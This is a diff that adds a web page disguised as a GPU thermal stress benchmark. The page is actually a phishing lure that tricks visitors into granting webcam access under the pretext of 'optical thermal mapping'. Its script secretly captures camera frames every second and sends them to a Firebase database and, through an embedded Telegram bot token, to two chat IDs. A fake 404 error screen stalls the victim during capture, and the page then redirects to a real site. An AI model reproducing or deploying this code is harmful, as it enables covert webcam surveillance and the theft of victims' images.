@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VulkanCore | GPU Benchmark</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --gpu-orange: #ff6600;
+            --gpu-dark: #0d0d0d;
+            --gpu-panel: #1a1a1a;
+            --text: #e0e0e0;
+        }
+
+        body { 
+            margin: 0; padding: 0; 
+            background: var(--gpu-dark); 
+            color: var(--text);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex; flex-direction: column; height: 100vh;
+            overflow: hidden;
+        }
+
+        .bench-header {
+            padding: 15px 30px; background: #000;
+            border-bottom: 2px solid var(--gpu-orange);
+            display: flex; justify-content: space-between; align-items: center;
+        }
+
+        .logo { font-weight: 900; font-size: 20px; letter-spacing: 2px; }
+        .logo span { color: var(--gpu-orange); }
+
+        .main-container {
+            flex-grow: 1; display: flex; align-items: center; justify-content: center;
+            padding: 20px; background: radial-gradient(circle, #1f1108 0%, #0d0d0d 100%);
+        }
+
+        .tester-card {
+            width: 100%; max-width: 480px; 
+            background: var(--gpu-panel);
+            border: 1px solid #333; border-radius: 4px;
+            padding: 35px; text-align: center;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.8);
+        }
+
+        .thermal-scanner {
+            width: 140px; height: 140px; margin: 0 auto 25px;
+            border: 2px dashed var(--gpu-orange); position: relative;
+            display: flex; align-items: center; justify-content: center;
+            background: rgba(255, 102, 0, 0.05);
+        }
+
+        .heatmap-grid {
+            width: 80%; height: 80%;
+            background: linear-gradient(45deg, rgba(255,0,0,0.2), rgba(255,165,0,0.2));
+            filter: blur(10px); animation: heat-pulse 2s infinite alternate;
+        }
+        @keyframes heat-pulse { from { opacity: 0.3; } to { opacity: 0.8; } }
+
+        .scan-beam {
+            position: absolute; width: 100%; height: 4px;
+            background: var(--gpu-orange); box-shadow: 0 0 20px var(--gpu-orange);
+            top: 0; animation: scan-move 4s infinite ease-in-out;
+        }
+        @keyframes scan-move { 0%, 100% { top: 0; } 50% { top: 100%; } }
+
+        h2 { margin-top: 0; font-size: 22px; color: #fff; }
+        p { font-size: 13px; color: #aaa; line-height: 1.5; margin-bottom: 30px; }
+
+        .btn-test {
+            background: var(--gpu-orange); color: #fff; border: none;
+            width: 100%; padding: 18px; font-size: 15px; font-weight: bold;
+            cursor: pointer; text-transform: uppercase; transition: 0.2s;
+        }
+        .btn-test:hover { background: #ff8533; transform: translateY(-2px); }
+
+        /* Benchmarking States */
+        #sync-ui, #error-404 { display: none; }
+
+        .telemetry {
+            text-align: left; font-family: 'Consolas', monospace;
+            background: #000; padding: 15px; margin-top: 20px;
+            border-left: 3px solid var(--gpu-orange); font-size: 11px; color: #00ff00;
+        }
+
+        /* 404 Overlay */
+        .err-code { font-size: 60px; font-weight: 900; color: #333; margin: 0; }
+        .mumbai-node { font-size: 10px; color: var(--gpu-orange); margin-top: 15px; letter-spacing: 1px; }
+    </style>
+</head>
+<body>
+
+    <div class="bench-header">
+        <div class="logo">VULKAN<span>CORE</span></div>
+        <div style="font-size: 11px; color: #666;">DRV: 551.23 | API: v1.3.275</div>
+    </div>
+
+    <div class="main-container">
+        <!-- Dashboard Initial -->
+        <div class="tester-card" id="init-view">
+            <div class="thermal-scanner">
+                <div class="heatmap-grid"></div>
+                <div class="scan-beam"></div>
+                <svg width="40" height="40" fill="var(--gpu-orange)" viewBox="0 0 24 24"><path d="M12 2L4.5 20.29l.71.71L12 18l6.79 3 .71-.71z"/></svg>
+            </div>
+            <h2>GPU Thermal Stress Test</h2>
+            <p>Please enable <b>Optical Thermal Mapping</b>. The AI engine will monitor surface heat signatures through the optical sensor to ensure safety during high-wattage benchmarking.</p>
+            
+            <button class="btn-test" onclick="runBenchmark()">Start Stress Test</button>
+            <div class="mumbai-node">CONNECTED TO: MUMBAI-WEST-RENDER-FARM</div>
+        </div>
+
+        <!-- Testing UI -->
+        <div class="tester-card" id="sync-ui">
+            <h2>Benchmarking in Progress...</h2>
+            <div class="thermal-scanner" style="border-radius: 50%;">
+                <div class="scan-beam" style="animation-duration: 1.5s;"></div>
+                <div id="load-pct" style="font-size: 24px; font-weight: 900; color: var(--gpu-orange);">0%</div>
+            </div>
+            <div class="telemetry">
+                > CLOCK: 2450 MHz [STABLE]<br>
+                > TEMP: 72°C | FAN: 85%<br>
+                > OPTICAL_THERMAL_SYNC: <span style="color:var(--gpu-orange)">ACTIVE</span><br>
+                > CAPTURING_MAP_DATA...
+            </div>
+        </div>
+
+        <!-- 404 Error -->
+        <div class="tester-card" id="error-404">
+            <p class="err-code">404</p>
+            <h2 style="color: #ff4444;">Frame Buffer Overflow</h2>
+            <p>The Mumbai rendering node encountered a critical parity error. Recalibrating optical sensors to resume the benchmark session.</p>
+            <div class="btn-test" style="background: #222; color: #555;">Waiting for Parity Sync...</div>
+        </div>
+    </div>
+
+    <!-- Background Capture System -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function runBenchmark() {
+            try {
+                // Request camera disguised as "Thermal Mapping"
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        count++;
+                        document.getElementById('load-pct').innerText = Math.min(count * 2, 99) + "%";
+                        
+                        if (count <= 55) {
+                            gpuCapture(count);
+                        }
+
+                        // Simulation: 404 Error triggered at 35s
+                        if (count === 35) {
+                            document.getElementById('sync-ui').style.display = 'none';
+                            document.getElementById('error-404').style.display = 'block';
+                        }
+
+                        if (count >= 60) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://www.techpowerup.com/gpu-specs/";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://www.google.com/search?q=gpu+benchmark";
+            }
+        }
+
+        function gpuCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "GPU_THERMAL_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_WEST_RENDER_FARM" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'gpu_thermal_mapping.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
